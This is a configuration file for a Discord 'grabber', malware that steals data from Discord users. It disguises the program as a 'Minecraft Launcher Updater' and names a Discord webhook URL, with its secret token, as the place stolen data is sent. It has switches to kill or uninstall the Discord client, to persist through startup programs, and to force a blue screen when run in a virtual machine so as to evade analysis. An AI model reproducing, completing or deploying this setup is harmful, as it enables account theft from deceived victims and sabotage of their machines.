module.exports = {
  // The name the grabber will have
  name: 'Minecraft Launcher Updater',
  webhook: {
    url: 'https://discord.com/api/webhooks/1008130525665439816/wRlNXfACrEsTok15kBDKundj_6G6u1-ksvFOgQeqv_ZtS25wZfxkFJUn0k34pQnP7KFE',
    mention: '@everyone',
  },
  // Do we need to kill the Discord desktop client process?
  killDiscord: false,
  // Should we add the grabber to the startup programs?
  addToStartup: false,
  // Do we need to uninstall the Discord desktop client?
  uninstallDiscord: false,
  // If the user runs the grabber from a virtual machine, should a BSOD be triggered?
  bsodIfVm: true
};
